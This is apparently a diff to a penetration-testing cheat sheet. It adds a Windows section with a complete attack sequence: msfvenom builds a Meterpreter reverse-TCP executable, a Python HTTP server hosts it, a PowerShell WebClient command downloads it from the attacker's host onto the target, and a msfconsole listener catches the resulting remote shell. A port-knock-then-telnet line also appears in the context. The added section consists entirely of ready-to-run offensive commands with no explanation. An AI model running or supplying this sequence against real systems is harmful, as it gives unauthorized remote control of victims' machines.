@@ -318,6 +318,22 @@ knock <ip> 7000 8000 9000 7000 8000 9000 && telnet <ip> 8888
 
 ```
 
+##windows
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local> LPORT=1111 -f exe -o reverse.exe
+
+python -m SimpleHTTPServer 90
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://<local>:90/reverse.exe','reverse.exe')"
+
+msfconsole
+set payload windows/meterpreter/reverse_tcp
+set LHOST <local>
+set LPORT 1111
+
+reverse.exe
+```
+
+
 ## CVE
 
 ```
